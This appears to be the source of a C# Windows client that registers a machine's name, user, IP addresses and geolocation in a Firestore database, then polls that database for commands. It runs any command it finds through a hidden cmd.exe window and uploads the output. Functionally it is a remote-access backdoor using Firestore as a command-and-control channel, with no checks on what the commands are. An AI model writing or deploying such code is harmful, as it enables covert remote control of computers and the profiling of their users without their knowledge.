using Google.Cloud.Firestore;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;


namespace ClientFirestore
{
    public partial class MainWindow : Window
    {
        // ====== Firestore ======
        private FirestoreDb Db => FirestoreProvider.Db;

        private string _pcKey;                 // "PC_PCNAME_USERNAME"
        private Timer _pingPollTimer;          // опрос ping
        private string _lastPingToken = "";

        private Timer _adminOpenPoll;          // опрос adminOpen
        private ChatWindow _chat;

        private Timer _cmdPollTimer;           // опрос команд
        private string _lastCmdId = "";

        private DocumentReference PcDoc =>
            string.IsNullOrEmpty(_pcKey)
                ? null
                : Db.Collection("pcList").Document(_pcKey);

        private DocumentReference CmdDoc =>
            PcDoc?.Collection("command").Document("current");

        private const string IPINFO_TOKEN = ""; // если есть токен ipinfo.io



        public MainWindow()
        {
            InitializeComponent();

            Closing += Window_Closing;
            AppDomain.CurrentDomain.ProcessExit += OnProcessExit;

        }

      

        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            await RegisterAsync();
            await SetOnlineAsync(true);
            StartPingPoll();
            StartCmdPoll();
            StartAdminOpenWatcher();
        }

        private async void Repeat_Click(object sender, RoutedEventArgs e)
        {
            await RegisterAsync();
            await SetOnlineAsync(true);
        }

        // ================= ВСПОМОГАТЕЛЬНЫЕ =================

        private static string NowLocal() => DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");

        private static string EscapeJson(string s)
        {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string GetLocalIp()
        {
            try
            {
                foreach (var ni in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (ni.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ni))
                    {
                        var s = ni.ToString();
                        if (!s.StartsWith("169.254")) return s;
                    }
                }
            }
            catch { }
            return "";
        }

        // ====== IP info ======

        private class IpInfo
        {
            public string ip { get; set; }
            public string city { get; set; }
            public string region { get; set; }
            public string country { get; set; }
        }

        private static async Task<IpInfo> FetchIpInfoAsync(string token)
        {
            string url = "https://ipinfo.io/json";
            if (!string.IsNullOrEmpty(token)) url += "?token=" + token;

            using (var http = new HttpClient())
            {
                var json = await http.GetStringAsync(url);

                // System.Text.Json
                return System.Text.Json.JsonSerializer.Deserialize<IpInfo>(json);

            }
        }

        private static async Task<string> FallbackPublicIpAsync()
        {
            using (var http = new HttpClient())
            {
                try { return (await http.GetStringAsync("https://api.ipify.org")).Trim(); } catch { }
                try { return (await http.GetStringAsync("https://checkip.amazonaws.com")).Trim(); } catch { }
                try { return (await http.GetStringAsync("https://ifconfig.me/ip")).Trim(); } catch { }
            }
            throw new Exception("Не удалось определить внешний IP.");
        }

        // ================ РЕГИСТРАЦИЯ В Firestore ===================

        private async Task RegisterAsync()
        {
            try
            {
                string pcName = Environment.MachineName;
                string userName = Environment.UserName;
                string localIp = GetLocalIp();

                var ipinfo = await FetchIpInfoAsync(IPINFO_TOKEN) ?? new IpInfo();
                string internetIp = !string.IsNullOrEmpty(ipinfo.ip)
                    ? ipinfo.ip
                    : await FallbackPublicIpAsync();

                _pcKey = "PC_" + pcName.Replace(".", "_") + "_" + userName.Replace(".", "_");

                var systemMap = new
                {
                    pcName = pcName,
                    userName = userName,
                    localIp = localIp,
                    internetIp = internetIp,
                    country = ipinfo.country ?? "",
                    region = ipinfo.region ?? "",
                    city = ipinfo.city ?? ""
                };

                var onlineMap = new
                {
                    pcOnline = 1,
                    startTime = NowLocal()
                };

                await PcDoc.SetAsync(new
                {
                    system = systemMap,
                    online = onlineMap
                }, SetOptions.MergeAll);
            }
            catch
            {
                // можно вывести лог/MessageBox по желанию
            }
        }

        // ================ ONLINE/OFFLINE + PING ===================

        private async Task SetOnlineAsync(bool online)
        {
            if (PcDoc == null) return;

            try
            {
                if (online)
                {
                    await PcDoc.UpdateAsync(new Dictionary<string, object>
                    {
                        ["online.pcOnline"] = 1,
                        ["online.startTime"] = NowLocal()
                    });
                }
                else
                {
                    await PcDoc.UpdateAsync(new Dictionary<string, object>
                    {
                        ["online.pcOnline"] = 0,
                        ["online.stopTime"] = NowLocal()
                    });
                }
            }
            catch
            {
            }
        }

        private void StartPingPoll()
        {
            _pingPollTimer?.Stop();
            _pingPollTimer?.Dispose();

            _pingPollTimer = new Timer(2000) { AutoReset = true };
            _pingPollTimer.Elapsed += async (_, __) => await PollPingAsync();
            _pingPollTimer.Start();
        }

        private async Task PollPingAsync()
        {
            if (PcDoc == null) return;

            try
            {
                var snap = await PcDoc.GetSnapshotAsync();
                if (!snap.Exists || !snap.ContainsField("online.ping")) return;

                var token = snap.GetValue<string>("online.ping") ?? "";
                if (string.IsNullOrEmpty(token) || token == _lastPingToken) return;

                // отвечаем pong
                await PcDoc.UpdateAsync("online.pong", token);
                _lastPingToken = token;
            }
            catch
            {
            }
        }

        // =================== WATCH AdminOpen (открыть чат) =================

        private void StartAdminOpenWatcher()
        {
            _adminOpenPoll?.Stop();
            _adminOpenPoll?.Dispose();

            _adminOpenPoll = new Timer(1000) { AutoReset = true };
            _adminOpenPoll.Elapsed += async (_, __) =>
            {
                if (PcDoc == null) return;

                try
                {
                    var snap = await PcDoc.GetSnapshotAsync();
                    if (!snap.Exists) return;

                    int adminOpen = snap.ContainsField("adminOpen")
                        ? snap.GetValue<int>("adminOpen")
                        : 0;

                    bool adminWantsOpen = adminOpen == 1;

                    Dispatcher.Invoke(() =>
                    {
                        if (adminWantsOpen)
                        {
                            if (_chat == null || !_chat.IsVisible)
                            {
                                _chat = new ChatWindow(_pcKey, Environment.UserName, false);
                                _chat.Show();
                            }
                        }
                        else
                        {
                            if (_chat != null && _chat.IsVisible)
                                _chat.Close();
                        }
                    });
                }
                catch
                {
                }
            };
            _adminOpenPoll.Start();
        }

        // =================== КОМАНДЫ CMD =======================

        private void StartCmdPoll()
        {
            _cmdPollTimer?.Stop();
            _cmdPollTimer?.Dispose();

            _cmdPollTimer = new Timer(1500) { AutoReset = true };
            _cmdPollTimer.Elapsed += async (_, __) => await PollCommandAsync();
            _cmdPollTimer.Start();
        }

        private static async Task<(int exitCode, string stdout, string stderr)> RunCommandAsync(string cmd)
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c chcp 65001>nul & " + cmd,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8
            };

            using (var p = System.Diagnostics.Process.Start(psi))
            {
                string stdout = await p.StandardOutput.ReadToEndAsync();
                string stderr = await p.StandardError.ReadToEndAsync();
                await Task.Run(() => p.WaitForExit());
                return (p.ExitCode, stdout, stderr);
            }
        }

        private static string Trunc(string s, int max)
        {
            if (string.IsNullOrEmpty(s)) return "";
            if (s.Length <= max) return s;
            return s.Substring(0, max) + "\n... [truncated]";
        }

        private async Task PollCommandAsync()
        {
            if (CmdDoc == null) return;

            try
            {
                var snap = await CmdDoc.GetSnapshotAsync();
                if (!snap.Exists) return;

                var data = snap.ToDictionary() ?? new System.Collections.Generic.Dictionary<string, object>();

                string id = data.ContainsKey("id") ? Convert.ToString(data["id"]) : "";
                string cmdText = data.ContainsKey("cmd") ? Convert.ToString(data["cmd"]) : "";
                string status = data.ContainsKey("status") ? Convert.ToString(data["status"]) : "new";

                if (string.IsNullOrWhiteSpace(id) || string.IsNullOrWhiteSpace(cmdText)) return;
                if (status != "new") return;
                if (id == _lastCmdId) return;

                _lastCmdId = id;

                // помечаем как running
                await CmdDoc.UpdateAsync(new Dictionary<string, object>
                {
                    ["status"] = "running",
                    ["worker"] = _pcKey
                });

                int exitCode = -1;
                string stdout = "", stderr = "";
                try
                {
                    var r = await RunCommandAsync(cmdText);
                    exitCode = r.exitCode;
                    stdout = r.stdout;
                    stderr = r.stderr;
                }
                catch (Exception ex)
                {
                    stderr = ex.Message;
                }

                var outSafe = Trunc(stdout, 60000);
                var errSafe = Trunc(stderr, 60000);

                await CmdDoc.UpdateAsync(new Dictionary<string, object>
                {
                    ["status"] = "done",
                    ["exitCode"] = exitCode,
                    ["stdout"] = outSafe,
                    ["stderr"] = errSafe,
                    ["cmd"] = cmdText,
                    ["id"] = id,
                    ["worker"] = _pcKey
                });
            }
            catch
            {
                // не даём таймеру упасть
            }
        }

        // =================== ЗАКРЫТИЕ =======================

        private async void Window_Closing(object sender, CancelEventArgs e)
        {
            try
            {
                _pingPollTimer?.Stop();
                _pingPollTimer?.Dispose();

                _cmdPollTimer?.Stop();
                _cmdPollTimer?.Dispose();

                _adminOpenPoll?.Stop();
                _adminOpenPoll?.Dispose();

                await SetOnlineAsync(false);
            }
            catch
            {
            }
        }

        private async void OnProcessExit(object sender, EventArgs e)
        {
            try
            {
                await SetOnlineAsync(false);
            }
            catch
            {
            }
        }
    }
}
